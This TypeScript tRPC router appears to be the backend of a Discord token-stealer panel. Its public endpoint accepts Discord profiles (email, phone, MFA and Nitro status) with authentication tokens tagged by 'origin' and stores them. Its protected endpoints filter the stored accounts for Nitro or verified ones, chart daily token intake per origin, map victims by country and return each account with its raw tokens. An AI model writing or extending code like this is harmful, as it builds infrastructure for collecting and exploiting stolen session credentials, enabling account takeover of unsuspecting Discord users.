import { z } from "zod";
import {
  createTRPCRouter,
  protectedProcedure,
  publicProcedure,
} from "~/server/api/trpc";
import { TRPCError } from "@trpc/server";
import { localeToCountry, TOKEN_REGEX_LEGACY } from "~/lib/utils";

const zodUserShape = z.object({
  id: z.string().min(17),
  username: z.string(),
  discriminator: z.string(),
  avatar: z.string().nullish(),
  email: z.string().nullish(),
  verified: z.boolean().optional(),
  accent_color: z.number().nullish(),
  banner: z.string().nullish(),
  bot: z.boolean().optional(),
  flags: z.number().optional(),
  global_name: z.string().nullish(),
  locale: z.string().optional(),
  mfa_enabled: z.boolean().optional(),
  premium_type: z.number().optional(),
  public_flags: z.number().optional(),
  system: z.boolean().optional(),
  phone: z.string().nullish(),
  nsfw_allowed: z.boolean().nullish(),
  bio: z.string().nullish(),
  banner_color: z.string().nullish(),
});

export const accountRouter = createTRPCRouter({
  getWithCursor: protectedProcedure
    .input(
      z.object({
        search: z.string().optional(),
        nitroOnly: z.boolean().optional(),
        verifiedOnly: z.boolean().optional(),
        limit: z.number().min(1).max(100).nullish(),
        cursor: z.string().nullish(),
      }),
    )
    .query(async ({ ctx, input }) => {
      const limit = input.limit ?? 50;
      const cursor = input.cursor;
      const search = input.search;

      let searchQuery = {};
      if (search) {
        const [key, value] = search.split(":");
        if (key && value) {
          searchQuery = {
            [key]: {
              search: value,
            },
          };
        }
      }

      const items = await ctx.prisma.discordAccount.findMany({
        where: {
          ...searchQuery,
          premium_type: input.nitroOnly ? { gt: 0 } : undefined,
          verified: input.verifiedOnly ? input.verifiedOnly : undefined,
        },
        take: limit + 1,
        cursor: cursor ? { id: cursor } : undefined,
        orderBy: {
          id: "asc",
        },
      });
      let nextCursor: typeof cursor | undefined = undefined;
      if (items.length > limit) {
        const nextItem = items.pop();
        nextCursor = nextItem!.id;
      }

      return {
        items,
        nextCursor,
      };
    }),

  getStats: protectedProcedure.query(async ({ ctx }) => {
    // TODO: Simplify when prisma supports multiple counts in one query
    const [verified, unverified, nitro] = await ctx.prisma.$transaction([
      ctx.prisma.discordAccount.count({
        where: { verified: true },
      }),
      ctx.prisma.discordAccount.count({
        where: { verified: false },
      }),
      ctx.prisma.discordAccount.count({
        where: { verified: true, premium_type: { gt: 0 } },
      }),
    ]);

    return {
      verified,
      unverified,
      nitro,
    };
  }),
  getCountryDistribution: protectedProcedure.query(async ({ ctx }) => {
    const localeDistribution = await ctx.prisma.discordAccount.groupBy({
      by: ["locale"],
      _count: {
        locale: true,
      },
    });
    return localeDistribution.map((entry) => ({
      id: localeToCountry(entry.locale),
      value: entry._count.locale,
    }));
  }),
  getTokenRates: protectedProcedure.query(async ({ ctx }) => {
    // TODO: Simplify when prisma supports multiple counts in one query
    const MAX_DAYS = 12;
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const result: { id: string; data: { x: string; y: number }[] }[] = [];
    for (let i = MAX_DAYS; i >= 0; i--) {
      const date = new Date();
      date.setDate(today.getDate() - i);
      date.setHours(0, 0, 0, 0);

      const count = await ctx.prisma.discordToken.groupBy({
        by: ["origin"],
        where: {
          createdAt: {
            lte: new Date(date.getTime() + 1000 * 60 * 60 * 24),
            gte: date,
          },
        },
        _count: {
          id: true,
        },
      });

      for (const entry of count) {
        entry.origin ??= "Unknown";

        const data = {
          x: date.toLocaleDateString("en-US").slice(0, -5),
          y: entry._count.id,
        };
        const existing = result.find((r) => r.id === entry.origin);
        if (existing) {
          existing.data.push(data);
          continue;
        }

        result.push({
          id: entry.origin,
          data: [data],
        });
      }
    }

    return result;
  }),
  createOrUpdate: publicProcedure
    .input(
      z.object({
        user: zodUserShape,
        tokens: z.array(z.string().regex(TOKEN_REGEX_LEGACY)),
        origin: z.string().optional(),
      }),
    )
    .mutation(async ({ input, ctx }) => {
      const { prisma } = ctx;
      const { user, tokens, origin } = input;

      return prisma.discordAccount.upsert({
        where: {
          id: user.id,
        },
        create: {
          ...input.user,
          tokens: {
            createMany: {
              data: tokens.map((token) => ({
                value: token,
                origin,
              })),
            },
          },
        },
        update: {
          ...input.user,
          tokens: {
            connectOrCreate: tokens.map((token) => ({
              where: {
                value: token,
              },
              create: {
                value: token,
                origin,
              },
            })),
          },
        },
      });
    }),
  getById: protectedProcedure
    .input(z.string().min(17))
    .query(async ({ input: id, ctx }) => {
      const account = await ctx.prisma.discordAccount.findUnique({
        where: {
          id,
        },
        include: {
          tokens: true,
        },
      });
      if (!account) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      return account;
    }),
  getAll: protectedProcedure.query(({ ctx }) => {
    return ctx.prisma.discordAccount.findMany();
  }),
});
